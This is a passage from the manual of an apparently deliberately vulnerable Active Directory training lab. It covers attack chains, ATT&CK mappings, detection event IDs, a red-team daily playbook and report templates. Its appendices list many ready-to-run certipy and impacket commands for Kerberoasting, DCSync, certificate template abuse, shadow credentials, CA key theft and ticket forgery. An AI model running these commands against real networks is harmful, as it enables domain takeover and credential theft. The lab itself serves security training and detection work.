### Chain 4: IPv6 to forest persistence — 5 patterns

```text
IA-022 mitm6 + WPAD                  (NTLM auth flowing to attacker)
    ↓
K      mitm6 + ntlmrelayx → RBCD     (RBCD on dc01$)
    ↓
S4U2Self+S4U2Proxy → cifs/dc01      (DA on corp.local)
    ↓
V      mimikatz sid::add foreign EA  (PAC carries finance EA 519)
    ↓
Z      Sapphire ticket persistence   (forest-wide stealth backdoor)
```

### Chain 5: tree-root takeover — 4 patterns

```text
B      ESC1 → Administrator@corp    (corp.local DA)
    ↓
DCSync corp krbtgt                  (corp krbtgt NT)
    ↓
R      Forge trust ticket → root    (DA on root.corp)
    ↓
P      ExtraSID corp → eu           (DA on eu.corp.local)
```

---

## 23. MITRE ATT&CK mapping

The mapping below tags each DVAD pattern with the primary ATT&CK technique IDs the operator exercises. Use this for blue-team report cross-walks.

| Pattern | ATT&CK Technique IDs | Tactic |
|---|---|---|
| IA-001 anonymous SMB | T1135, T1078.001 | Discovery, Initial Access |
| IA-002 anonymous LDAP | T1087.002, T1018 | Discovery |
| IA-003 DNS AXFR | T1590.002 | Reconnaissance |
| IA-005 AS-REP roast | T1558.004 | Credential Access |
| IA-006 password spray | T1110.003 | Credential Access |
| IA-013 PetitPotam coerce | T1187, T1557.001 | Credential Access, CDC |
| IA-015 EternalBlue | T1210, T1190 | Lateral, Initial Access |
| IA-016 ZeroLogon | T1210, T1098 | Initial Access, Persistence |
| A Kerberoast | T1558.003 | Credential Access |
| B ADCS ESC1 | T1649, T1078.002 | Credential Access |
| C Coerce + ESC8 | T1187 → T1649 | CDC → Cred Access |
| D RBCD | T1558, T1134.001 | Privilege Escalation |
| E noPac | T1078.002, T1068 | Privilege Escalation |
| F ZeroLogon | T1068, T1098.001 | Privilege Escalation |
| G ExtraSID | T1558.001, T1134.005 | Lateral, Privilege Escalation |
| H Golden Ticket | T1558.001 | Persistence |
| I Trust ticket | T1558.001 + T1482 | Lateral |
| J Phishing + LSASS dump | T1566.001, T1003.001 | Initial Access, Cred Access |
| K mitm6 + RBCD | T1557.002, T1558 | CDC, Privilege Escalation |
| P ExtraSID corp→eu | T1558.001, T1134.005 | Lateral |
| Q Trust key forge | T1558.001 | Lateral |
| R Tree-root trust | T1558.001 | Lateral |
| S FSP hijack | T1098.001, T1482 | Persistence |
| T Cross-forest roast | T1558.003 | Credential Access |
| U Cross-forest ADCS | T1649 | Credential Access |
| V SID History | T1134.005 | Privilege Escalation |
| W Cross-forest delegation | T1558, T1134.001 | Lateral |
| X noPac across trust | T1068 | Privilege Escalation |
| Y ESC11 NTLM relay | T1557.001, T1649 | CDC, Cred Access |
| Z Diamond/Sapphire | T1558.001 | Persistence |
| Golden Cert | T1649 + T1098.001 | Persistence |
| Skeleton Key | T1556.001 | Persistence |
| DSRM backdoor | T1098.005 | Persistence |
| Shadow Credentials | T1098.005 | Persistence |
| AdminSDHolder | T1098 | Persistence |

---

## 24. Detection & telemetry notes

DVAD ships with auditing **off** by default (it's a vulnerable lab), but the table below tells you what an EDR/SIEM would catch on a hardened tenant. Use it to validate detection rules you build against the lab.

| Action | Event ID(s) | Source | Indicator |
|---|---|---|---|
| Kerberoast (`GetUserSPNs`) | 4769 | DC Security log | Service Ticket request, encryption type 0x17 (RC4-HMAC), no preauth flag |
| AS-REP roast | 4768 | DC Security | `Pre-Auth Type: 0`, ticket etype 0x17 |
| ADCS request | 4886, 4887 | CA Operational | Subject Alt Name UPN ≠ requester |
| ADCS authentication | 4768 + Event 39 (KDC-Event) | DC | Certificate-based logon with different cert subject |
| DCSync | 4662 with `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` | DC Security | Non-DC principal calling DRSUAPI |
| Golden Ticket | 4769 ticket lifetime >10h; 4624 logon with mismatched RIDs | DC + endpoint | PAC anomalies; `klist` showing absurd ticket lifetimes |
| ZeroLogon | 5805, 5723 | Netlogon | Schannel reset, zeroed authenticator |
| PetitPotam | 5145 | DC File-Share Audit | `\PIPE\efsrpc` access |
| PrinterBug | 5145 | DC File-Share Audit | `\PIPE\spoolss` access |
| noPac | 4662 + 4742 | DC | Machine account renamed to DC SamAccountName |
| RBCD write | 5136 | DC LDAP | `msDS-AllowedToActOnBehalfOfOtherIdentity` modified |
| mitm6 | DHCPv6 logs | network | Rogue IPv6 RA, WPAD response |
| LSASS dump | 4688 with `comsvcs.dll, MiniDump` arg | Sysmon Event 10 | Handle to `lsass.exe` with 0x1010 access |
| Skeleton Key | 4673 | DC | Patched LSASS / LsaLogonUser |
| Shadow Credentials | 5136 | DC LDAP | `msDS-KeyCredentialLink` write |

Sysmon config to drop on a host you want to baseline: [`olafhartong/sysmon-modular`](https://github.com/olafhartong/sysmon-modular). DVAD's `windows_base` role explicitly disables Sysmon — re-enable it manually if you want to test detections.

---

## 25. Operator playbook — daily rhythms

Multi-day engagements settle into a repeatable rhythm. The cadence below mirrors how a real red-team operator (and how the DVAD instructor expects students) to work each day.

### Day 1 — Foothold + map

```text
09:00  Stand up attacker box, /etc/hosts, krb5.conf, time-sync
09:30  IA-001 (anon SMB) + IA-002 (anon LDAP) + IA-003 (AXFR) — produces users.txt + computers.txt + sites.txt
10:30  IA-005 (AS-REP) + IA-006 (spray) — one or both produce ≥1 cred
11:30  BloodHound collection (--collectionmethod all) → import → "Shortest path to DA"
12:30  CRED-001 (Kerberoast all SPNs) → crack offline; CRED-003 (AS-REP re-run); CRED-026 (SYSVOL grep)
14:00  ENUM-021..030 (RPC pipes) — fingerprint coercion + relay surface
15:30  ENUM-041..050 (ADCS find -vulnerable) — confirm ESC1..ESC16 mix
16:30  Initial chain selection: which of Patterns A/B/C/D/E gets you to DA fastest?
17:00  Daily writeup: what was found, what's still unknown, tomorrow's plan
```

### Day 2 — Privilege escalation

```text
09:00  Execute selected pattern → DA on corp.local
10:00  DCSync krbtgt + every service hash → archive (`secretsdump`)
11:00  Plant 2x persistence (one quiet: Shadow Creds; one loud: Golden Ticket) — verify both
12:30  PE-019..033 audit — anything missed? Backup Ops? gMSA?
14:00  Pivot inventory: which member hosts now own all creds for?
15:30  PE on ws01, file01, sql01 → SYSTEM on each (avoid noisy procdump)
17:00  Daily writeup; choose cross-forest target for Day 3
```

### Day 3 — Cross-forest expansion

```text
09:00  Trust-key extraction (CRED-006 ×2) for finance + root
10:00  Pattern Q → DA on finance.local; Pattern R → DA on root.corp
11:30  Pattern G → DA on eu.corp.local (often easiest, child)
13:30  Foreign-forest persistence (DSRM, Sapphire, Shadow Creds) on every DC
15:00  Reverse pivots: from foreign DA back into corp via FSP hijack — verify SID filtering off
17:00  Daily writeup; begin objective fulfilment (data exfil simulation, etc.)
```

### Day 4 — Cleanup + report

```text
09:00  Revert lab persistence (golden tickets expire, but skeleton/DSRM stay)
10:00  DF-031..040 cleanup if you're handing the lab to another student
13:00  Draft report (§26 templates) — every flag captured, every pattern exercised
16:00  Demo / debrief
```

### Operator skill matrix

The "minimum competency to claim DVAD complete" is:

- ✅ Has manually executed Patterns A, B, C, D, E, G, H end-to-end (no Metasploit)
- ✅ Has run BloodHound and explained 3 distinct edges (DCSync, GenericAll, AllowedToAct)
- ✅ Has used `certipy` to abuse at least 3 of ESC1/2/3/4/6/8/9/10/11/13/15
- ✅ Has captured ≥1 NTLM hash via PetitPotam, ≥1 via mitm6
- ✅ Can articulate why DVAD ships `MachineAccountQuota=10` (Pattern E precondition)
- ✅ Has forged a Golden Ticket and used it for `secretsdump`
- ✅ Has DA on every DC (corp, eu, finance, root)
- ✅ Has planted ≥2 persistence techniques per tier (domain, object, cert, host)

### Cheat-sheet: which tool for which job

| Need | Reach for | Why |
|---|---|---|
| AD object enumeration | `bloodhound-python` first, then `nxc ldap -M` for follow-ups | BH gives you visual paths; `nxc` modules surface specific misconfigs (`gpoenum`, `enum_trusts`) |
| Kerberoast | `impacket-GetUserSPNs` | More flexible than `Rubeus` for cross-realm |
| AS-REP roast | `impacket-GetNPUsers` | One-liner with `-usersfile` |
| Cracking | `hashcat -m 13100` (TGS) / `5600` (NetNTLMv2) / `18200` (AS-REP) | GPU acceleration matters |
| Coercion | `impacket-PetitPotam` → `dfscoerce.py` → `printerbug.py` | Try in that order; one of them is open on every DC |
| NTLM relay | `impacket-ntlmrelayx` | Universal sink (`-t smb://`, `-t ldap://`, `-t http://`, `-t rpc://`) |
| ADCS | `certipy` | Replaces `Certify.exe` for Linux operators |
| Lateral | `impacket-psexec` first, fall back to `evil-winrm` (no Service install event) | `psexec` is loud; `winrm` is the modern default |
| Token / LSASS | `pypykatz` offline, `mimikatz` interactive | Offline parsing avoids touching LSASS on target |
| Trust forge | `impacket-ticketer` | Has `-extra-sid`, `-spn krbtgt/<foreign>` |
| Persistence | `Rubeus` (sapphire/diamond), `certipy` (shadow), `mimikatz` (skeleton, dsrm) | Different tools for different tiers |

---

## 26. Red-team report templates

DVAD-as-engagement deliverables. Pick the right template for the audience.

### 26.1 Executive summary

```markdown
# Engagement: DVAD Internal Lab Assessment
**Period:** YYYY-MM-DD → YYYY-MM-DD
**Scope:** corp.local, eu.corp.local, finance.local, root.corp (382 flag IDs)

## TL;DR
We achieved **Enterprise Admin on all four forests** within **N hours** from a
zero-credential start, with no operator-side custom code beyond freely-available
red-team tools (impacket, certipy, bloodhound-python).

## Critical findings
1. **Trust SID filtering disabled** — single ticket forgery (`impacket-ticketer
   -extra-sid <FIN_SID>-519`) escalated corp.local Administrator to Enterprise
   Admin on finance.local in under 60 s.
2. **krbtgt fixed at known value** — every DA-equivalent on every DC.
3. **ADCS ESC1+ESC8 published** — Domain Users → Administrator in two
   `certipy` calls.

## Quantified impact
- **Domains compromised:** 4 / 4 (100 %)
- **Forests compromised:** 3 / 3 (100 %)
- **Flags captured:** 382 / 382 (100 %)
- **Persistence dropped:** 11 distinct techniques across 4 tiers
- **MTTC (mean time to compromise):** ~5 min (canonical solve)
```

### 26.2 Technical write-up template

```markdown
# Finding: <Pattern letter> — <name>

**Severity:** Critical / High / Medium / Low
**ATT&CK ID(s):** T1558.003 (Kerberoasting), …
**DVAD flag(s):** FLAG-CRED-001, FLAG-LAT-018, …

## Preconditions
- Any authenticated low-priv domain user
- Network reach to dc01.corp.local on tcp/88
- (Optional) cleartext or NT hash for offline cracking

## Reproduction
```bash
impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request -outputfile spns.kr
hashcat -m 13100 spns.kr /usr/share/wordlists/rockyou.txt --force
```

## Evidence
- `spns.kr` (attached)
- `hashcat.potfile` excerpt: `$krb5tgs$23$*svc_web$CORP.LOCAL...:Summer2023!`
- Screenshot: BloodHound path "Domain Users → svc_web (Kerberoastable) → Domain Admins"

## Impact
Initial-foothold low-priv user obtains a service-account password that grants
local Administrator on file01 + sql01, enabling lateral movement.

## Recommendation
1. Rotate `svc_web` to a 25+ char machine-generated password or migrate to gMSA
2. Enforce AES-only Kerberos (set `msDS-SupportedEncryptionTypes` = 0x18)
3. Enable Audit Kerberos Service Ticket Operations (Success/Failure)
4. Deploy a Kerberoast detection rule (Sysmon event 4769 etype 0x17)

## References
- MITRE ATT&CK T1558.003
- https://attack.mitre.org/techniques/T1558/003/
```

### 26.3 Per-flag evidence ledger

```markdown
| Flag ID | Capture method | Tool | Operator | Timestamp |
|---|---|---|---|---|
| FLAG-IA-001 | Anonymous SMB share list | `nxc smb 10.10.0.10 -u '' -p ''` | sanchit | 2026-05-20T09:14:02Z |
| FLAG-CRED-001 | Kerberoast crack | `hashcat -m 13100` | sanchit | 2026-05-20T11:33:51Z |
| ... | ... | ... | ... | ... |
```

### 26.4 Remediation timeline

```markdown
| Priority | Finding | ETA | Owner |
|---|---|---|---|
| P0 | Re-enable SID filtering on every trust | 1 day | AD team |
| P0 | Rotate krbtgt twice (PSO 10 hours apart) | 1 day | AD team |
| P0 | Revoke ESC1/ESC8 templates (Issue or remove ENROLLEE_SUPPLIES_SUBJECT) | 1 day | PKI team |
| P1 | Deploy LAPS to all member hosts | 1 week | endpoint |
| P1 | Move service accounts to gMSA | 2 weeks | AD team |
| P2 | Enable LDAP signing + channel binding | 2 weeks | AD team |
| P2 | Disable SMBv1 lab-wide | 1 week | endpoint |
| P3 | Audit Backup Operators / Server Operators members | 1 month | IAM |
```

---

## 27. Lab-extension recipes

DVAD ships 8 VMs but the topology is extensible. The following recipes add new attack surfaces without breaking the existing playbook.

### 27.1 Add a Linux SSSD-joined host

```yaml
# ansible/inventory.yml — under [linux_members]
linux01.corp.local:
  ansible_host: 10.10.0.15
  ansible_connection: ssh
  ansible_user: root
```

```bash
# Promote linux01 into corp.local via realm-join (run on the new VM):
realm join --user=Administrator corp.local --install=/
sssd_clear_cache
id alice@corp.local
```

Exposes: `LDAP_AUTHID_USERS_*` enumeration, `getent passwd` over LDAP, SSH key-based attack chains, `sudoers` over SSSD.

### 27.2 Add Exchange / Outlook Web Access

```bash
# Pre-req: 10 GB RAM headroom; 80 GB disk on VPS
# Spin up a new VM exch01.corp.local, install Exchange 2019 CU14
# Add inventory entry under [member_servers]
# Then trigger ProxyShell pattern L
python3 ProxyShell.py -t https://exchange.corp.local -e Administrator@corp.local
```

### 27.3 Add Azure AD Connect (hybrid)

Deploy AAD Connect on a new member; pre-stage MSOL_ account with weak password.
Exercises: Pass-Through Authentication abuse, AADInternals, Seamless SSO ticket extraction.

### 27.4 Add SCCM site server

Promote `sccm01.corp.local` with a primary site; deploy NAA account; expose PXE.
Run PXEThief, NAA harvest, Site Server Takeover (CMTAKEOVER) techniques.

### 27.5 Add a Jenkins / GitLab CI host

Drop `ci01.corp.local` with Jenkins default admin and an SSH agent reaching `file01`.
Exercises: secret extraction from build env, RCE via Groovy console, agent-side privilege escalation.

### 27.6 Inject a vulnerable IIS app

```powershell
# On any IIS host (ca01 already runs IIS):
New-WebApplication -Name 'dvwa' -Site 'Default Web Site' -PhysicalPath 'C:\inetpub\dvwa'
# Drop a deliberately broken ASP.NET app exposing /upload, /admin, /login
```

### 27.7 Pre-deploy LAPS for an "after hardening" exercise

```yaml
# In ansible/roles/ad_domain/tasks/main.yml, after the weak password policy:
- name: install LAPS schema
  win_command: powershell -c "Import-Module AdmPwd.PS; Update-AdmPwdADSchema"
- name: extend ms-Mcs-AdmPwd on ws01
  win_command: powershell -c "Set-AdmPwdComputerSelfPermission -OrgUnit 'CN=Computers,DC=corp,DC=local'"
```

Run pattern PE-020 against it — the lab still drops PEs but local-admin password rotation breaks lateral.

### 27.8 Inject custom services on each host

The flag_factory loop can be extended — add new IDs to `vars/main.yml` and they auto-drop. Schema:

```yaml
- { id: CUST-001, cat: Custom, desc: "...", host: dc01.corp.local, acl: domain_users }
```

`roles/flag_factory/tasks/main.yml` is category-agnostic so any new `cat:` value works.

---

## 28. Cleanup and reset

```bash
# Stop the WG gateway if VPS:
sudo bash scripts/vps-wg-gateway.sh down

# Destroy all VMs (qcow2 disks removed):
bash qemu/vm-create.sh destroy

# Tear down bridges + dnsmasq + NAT:
bash qemu/network/setup-network.sh destroy

# Wipe persistent state:
rm -rf vms/ media/ autounattend/

# Re-deploy from scratch:
./deploy.sh
```

The WG keys under `/etc/wireguard/*.key` and `wg-dvad.conf` are intentionally left in place after `down` — delete them by hand for a clean slate.

---

## 29. Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| `Permission denied` on `/dev/kvm` | New shell hasn't picked up `kvm`/`libvirt` group membership | Log out and back in |
| `wg-quick up` succeeds but no ping to lab | IP forwarding off on VPS, or wrong WAN iface detected | `sysctl net.ipv4.ip_forward` should be 1; check `iptables -t nat -L POSTROUTING` |
| Ping works, SMB times out | Windows Firewall came back up | Re-run `ansible-playbook ... --tags windows_base` |
| `getST` returns `KDC_ERR_C_PRINCIPAL_UNKNOWN` | DNS resolution wrong | Verify `/etc/hosts` matches §5; `dig @10.10.0.10 dc01.corp.local` |
| `getST` returns `KRB_AP_ERR_SKEW` | Time skew > 5 min | `sudo rdate -n 10.10.0.10` |
| Kerberoast returns 0 SPNs | Wrong DC, wrong realm, or alice locked out | Re-run with `-dc-host dc01.corp.local`; check `nxc smb 10.10.0.10 -u alice -p '...'` first |
| `certipy find` empty | ADCS role not promoted yet | `ansible-playbook ... --tags adcs_setup` |
| Cross-forest TGS fails | Trust account hash stale | DVAD intentionally fixes `TrustKey2024!` — re-derive NT hash from that |
| Ansible WinRM refused | VM still in install | `tail -f vms/<name>.log`; watch via VNC |
| Massgrave activation hangs | No outbound internet on VPS | Best-effort; can be ignored |
| Triple-fault on VM boot | OVMF/swtpm version mismatch | Reinstall both from distro repo |

---

## 30. References

- [`PLAN.md`](PLAN.md) — authoritative attack-matrix spec (382 IDs, every precondition)
- [`docs/00-index.md`](docs/00-index.md) — full docs index
- [`docs/01-setup.md`](docs/01-setup.md) — deployment + attacker prep deep-dive
- [`docs/02-recon.md`](docs/02-recon.md) — Phase 1 recon
- [`docs/02a-initial-access.md`](docs/02a-initial-access.md) — IA-001..050 per-technique
- [`docs/02b-enumeration.md`](docs/02b-enumeration.md) — ENUM-001..080 catalog
- [`docs/03-credential-access.md`](docs/03-credential-access.md) — CRED-001..065
- [`docs/04-lateral-movement.md`](docs/04-lateral-movement.md) — LAT-001..035
- [`docs/05-privilege-escalation.md`](docs/05-privilege-escalation.md) — PE-001..060
- [`docs/06-persistence.md`](docs/06-persistence.md) — PER-001..037
- [`docs/07-forest-compromise.md`](docs/07-forest-compromise.md) — DF-001..040
- [`docs/08-solve-path.md`](docs/08-solve-path.md) — canonical solve + 25 pattern wireframes
- [`docs/09-vps-deploy.md`](docs/09-vps-deploy.md) — WireGuard gateway threat model
- [`docs/hosts/`](docs/hosts/) — per-host crib sheets

---

## Appendix A — BloodHound query reference

After importing the `bloodhound-python --collectionmethod all --zip` output, the queries below replace 95 % of manual `nxc ldap` invocations. Each query has the title to paste into the BloodHound GUI search bar followed by an explanation of the operator value.

### A.1 Built-in queries every operator should run

| Query | What it shows | Operator use |
|---|---|---|
| Find all Domain Admins | DA list per domain | Confirms tenant boundary |
| Find Shortest Paths to Domain Admins | Hop chain from any node | Choose your attack target |
| Find Principals with DCSync Rights | Who can `secretsdump -just-dc` | Promotes `sync_user` to your "free win" |
| Find Kerberoastable Accounts | Users with SPNs | Drives Pattern A target selection |
| Find AS-REP Roastable Users | `DoNotRequirePreAuth` set | Drives IA-005 target selection |
| Find Computers with Unconstrained Delegation | TGT capture surface | Drives Pattern W |
| Shortest Paths from Owned Principals | After marking alice "owned" | Lights up downstream graph |
| Find all Edges with `AllExtendedRights` | ESC-equivalents | Surfaces ADCS ESC4 |

### A.2 Custom Cypher — Kerberoastable to DA

```cypher
MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN p
```

### A.3 Custom Cypher — ESC1 path

```cypher
MATCH p=(u:User)-[:MemberOf*1..]->(:Group)-[:Enroll|GenericAll|GenericWrite|AllExtendedRights|WriteDacl]->(c:CertTemplate {enrolleesuppliessubject:true,authenticationenabled:true,nomanagerapproval:true})
RETURN p
```

### A.4 Custom Cypher — Cross-forest reachability

```cypher
MATCH p=(s)-[*1..6]->(d) WHERE s.domain <> d.domain RETURN p LIMIT 25
```

### A.5 Custom Cypher — RBCD candidates from owned

```cypher
MATCH (o)-[:Owns]->(s:Computer) MATCH (t:Computer) WHERE t<>s
WITH s,t MATCH p=shortestPath((s)-[*1..]->(t))
RETURN p LIMIT 10
```

### A.6 Custom Cypher — Find dangerous ACL edges on AdminSDHolder

```cypher
MATCH p=(n)-[:GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights]->(a {name:'ADMINSDHOLDER@CORP.LOCAL'})
RETURN p
```

### A.7 Custom Cypher — Find owners of `Domain Admins`

```cypher
MATCH p=(n)-[:Owns]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}) RETURN p
```

### A.8 Custom Cypher — Foreign Group Membership chains

```cypher
MATCH p=(u:User)-[:MemberOf*1..3]->(g:Group) WHERE u.domain <> g.domain RETURN p LIMIT 50
```

### A.9 Custom Cypher — Find Computers with `unconstraineddelegation:true`

```cypher
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name,c.objectid
```

### A.10 Custom Cypher — Sessions of high-value users on member hosts

```cypher
MATCH (u:User {admincount:true})-[:HasSession]->(c:Computer) RETURN u.name,c.name LIMIT 50
```

### A.11 Owning a node

Right-click → "Mark User as Owned" — recompute paths. DVAD operators should mark `alice` immediately after IA-006, then re-run "Shortest Paths from Owned Principals."

### A.12 Path-Finding tips

- BloodHound CE supports `Pre-Built Queries → Find Tier Zero Assets` — useful to identify what *should* be Tier 0 vs what DVAD actually puts there.
- Long paths (>6 hops) often indicate ACL bloat; DVAD intentionally has 4-hop paths to keep the lab teachable.
- The `--zip` flag bundles into a single archive — drag-and-drop into BH GUI.

---

## Appendix B — Certipy exhaustive command reference

### B.1 Enumeration

```bash
# Full enumeration (no filter)
certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10
# Only enabled templates
certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -enabled
# Only vulnerable templates
certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable
# JSON output for parsing
certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -json -output dvad_certs.json
# Text output (default)
certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -stdout
# Force LDAP over SSL (avoids LDAP signing block)
certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -scheme ldaps
# Use Kerberos
certipy find -k -no-pass -u alice@corp.local -dc-ip 10.10.0.10
# Use NT hash
certipy find -u alice@corp.local -hashes :<NT> -dc-ip 10.10.0.10
```

### B.2 Request (request a certificate)

```bash
# Standard ESC1 (ENROLLEE_SUPPLIES_SUBJECT)
certipy req -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
            -ca CORP-CA -template ESC1Template -upn Administrator@corp.local
# Use NetBIOS CA name vs DNS
certipy req -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
            -ca 'CORP-CA' -target ca01.corp.local -template ESC1Template -upn Administrator
# Force DNS-style cert (ESC8 path)
certipy req -u alice@corp.local -p 'DVADlab2024!' -ca CORP-CA \
            -template DomainController -dns dc01.corp.local
# Add a SID extension (ESC9/ESC10/ESC14 chain)
certipy req -u alice@corp.local -p 'DVADlab2024!' -ca CORP-CA \
            -template ESC9Template -upn Administrator@corp.local \
            -sid S-1-5-21-XXX-500
# Request via web enrol (ESC8)
certipy req -u alice@corp.local -p 'DVADlab2024!' \
            -ca CORP-CA -template DomainController -web -target ca01.corp.local
# Request via CES/CEP
certipy req -u alice@corp.local -p 'DVADlab2024!' \
            -ca CORP-CA -template User -cep https://ca01.corp.local/CEP
# Specify EKU (ESC15 / Application Policies)
certipy req -u alice@corp.local -p 'DVADlab2024!' -ca CORP-CA \
            -template WebServer -application-policies 'Client Authentication'
# Pre-load PFX password
certipy req -u alice@corp.local -p 'DVADlab2024!' -ca CORP-CA \
            -template User -pfx-password 'MyPfxPass123!'
```

### B.3 Authenticate (PKINIT)

```bash
# Basic — extracts NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
# Specify domain explicitly
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10 -domain corp.local
# Specify the principal (overrides cert subject)
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10 -username Administrator -domain corp.local
# Print TGT only (no NT hash retrieval)
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10 -no-hash
# Save TGT to ccache
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10 -save
```

### B.4 Shadow Credentials (msDS-KeyCredentialLink)

```bash
# Auto (write + auth + restore)
certipy shadow auto -u alice@corp.local -p 'DVADlab2024!' \
                    -account 'Administrator' -dc-ip 10.10.0.10
# Add a key without removing existing
certipy shadow add -u alice@corp.local -p 'DVADlab2024!' \
                   -account 'svc_target' -dc-ip 10.10.0.10
# List current keys
certipy shadow list -u alice@corp.local -p 'DVADlab2024!' \
                    -account 'svc_target' -dc-ip 10.10.0.10
# Clear all keys
certipy shadow clear -u alice@corp.local -p 'DVADlab2024!' \
                     -account 'svc_target' -dc-ip 10.10.0.10
# Remove one specific key (by device ID)
certipy shadow remove -u alice -p ... -account victim -device-id <guid>
```

### B.5 Template manipulation (ESC4 / ESC7)

```bash
# Make a template ESC1-vulnerable
certipy template -u Administrator@corp.local -p 'DVADlab2024!' \
                 -template User -save-old
# Restore from snapshot
certipy template -u Administrator@corp.local -p 'DVADlab2024!' \
                 -template User -configuration old_User.json
# Force a specific config blob
certipy template -u Administrator@corp.local -p ... -template ESC4Template \
                 -configuration custom.json
```

### B.6 CA manipulation (ESC7)

```bash
# Add yourself as an Officer
certipy ca -u alice@corp.local -p 'DVADlab2024!' -ca CORP-CA -add-officer alice
# Issue a held request
certipy ca -u alice -p ... -ca CORP-CA -issue-request <req-id>
# Enable a disabled template (SubCA)
certipy ca -u alice -p ... -ca CORP-CA -enable-template SubCA
# Backup the CA certificate + private key
certipy ca -u Administrator -p ... -ca CORP-CA -backup
# Extract CRL signing key
certipy ca -u Administrator -p ... -ca CORP-CA -extract-key
```

### B.7 Forge (offline using Golden Cert)

```bash
# After ca -backup, forge any cert offline
certipy forge -ca-pfx CORP-CA.pfx -upn Administrator@corp.local
```

### B.8 Cert conversion

```bash
# PFX → PEM
certipy cert -pfx administrator.pfx -nocert -out admin.key
certipy cert -pfx administrator.pfx -nokey  -out admin.crt
# Add password to existing PFX
certipy cert -pfx administrator.pfx -export -password 'NewPass' -out new.pfx
```

### B.9 Account manipulation (UPN/SID swap for ESC9/ESC10/ESC14)

```bash
certipy account update -u Administrator@corp.local -p ... \
                       -user victim -upn Administrator@corp.local
certipy account update -u Administrator@corp.local -p ... \
                       -user victim -sid S-1-5-21-XXX-500
# Read current attribs
certipy account read -u alice -p ... -user victim
```

### B.10 Pre-flight: scheme + LDAP signing

```bash
# DVAD ships with LDAP signing NOT REQUIRED — but the helper exists:
certipy find ... -scheme ldap                       # cleartext
certipy find ... -scheme ldaps                      # SSL but no channel binding
certipy find ... -ldap-channel-binding              # if env enforces it
certipy find ... -k -no-pass                        # Kerberos GSSAPI
```

---

## Appendix C — Impacket exhaustive flag reference

The impacket tools are DVAD's workhorse. Each accepts a wide flag set you'll mix-and-match.

### C.1 `impacket-secretsdump`

```text
Usage: secretsdump.py [-h] [-debug] [-system SYSTEM] [-bootkey BOOTKEY]
                      [-security SECURITY] [-sam SAM] [-ntds NTDS]
                      [-resumefile RESUMEFILE] [-history] [-pwd-last-set]
                      [-user-status] [-just-dc-user USERNAME] [-just-dc]
                      [-just-dc-ntlm] [-pwd-history] [-use-vss] [-rodcNo RODCNO]
                      [-rodcKey RODCKEY] [-exec-method {smbexec,wmiexec,mmcexec}]
                      [-no-pass] [-k] [-aesKey hex] [-keytab FILE]
                      [-dc-ip ip] [-target-ip ip] [-hashes LMHASH:NTHASH]
                      target
```

**Most useful invocations:**

```bash
# Full NTDS via DRSUAPI (DCSync)
impacket-secretsdump corp.local/Administrator:'DVADlab2024!'@10.10.0.10
# Just one user
impacket-secretsdump -just-dc-user krbtgt corp.local/Administrator@10.10.0.10
# Hashes only (skip NTLM rounds, faster)
impacket-secretsdump -just-dc-ntlm corp.local/Administrator@10.10.0.10
# Use ticket (no password)
impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@dc01.corp.local
# Local SAM + SYSTEM dump
impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL
# Use NT hash (overpass-the-hash)
impacket-secretsdump -hashes :<NT> corp.local/Administrator@10.10.0.10
# Pull machine account secrets
impacket-secretsdump -just-dc-user 'dc01$' corp.local/Administrator@10.10.0.10
# Use AES Kerberos key
impacket-secretsdump -aesKey <hex> -k -no-pass corp.local/Administrator@dc01.corp.local
# Dump from RODC
impacket-secretsdump corp.local/krbtgt_<RODC>:...@<rodc> -rodcKey <key>
```

### C.2 `impacket-getTGT`

```bash
# Cleartext
impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
# NT hash
impacket-getTGT corp.local/alice -hashes :<NT> -dc-ip 10.10.0.10
# AES256
impacket-getTGT corp.local/alice -aesKey <hex256> -dc-ip 10.10.0.10
# Specify KDC
impacket-getTGT corp.local/alice:... -dc-ip 10.10.0.10 -dc-host dc01.corp.local
# Override output file
impacket-getTGT corp.local/alice:... -dc-ip 10.10.0.10 -k -no-pass
```

### C.3 `impacket-getST`

```bash
# S4U2Self + S4U2Proxy (constrained delegation / RBCD)
impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator \
               corp.local/svc_web:'Summer2023!' -dc-ip 10.10.0.10
# Cross-realm with -target-domain
impacket-getST -k -no-pass -target-domain finance.local -dc-ip 10.20.0.10 \
               -spn cifs/dc01.finance.local -impersonate Administrator \
               corp.local/Administrator
# Use ticket file
KRB5CCNAME=alice.ccache impacket-getST -k -no-pass -spn cifs/dc01 -impersonate Administrator corp.local/alice
# Force etype
impacket-getST -force-forwardable -spn cifs/dc01 -impersonate Administrator ...
```

### C.4 `impacket-GetUserSPNs`

```bash
# Roast every SPN
impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request -outputfile spns.kr
# Roast a single user
impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request-user svc_web
# Cross-realm
impacket-GetUserSPNs -k -no-pass -target-domain finance.local -dc-ip 10.20.0.10 -request corp.local/alice
# Use NT hash
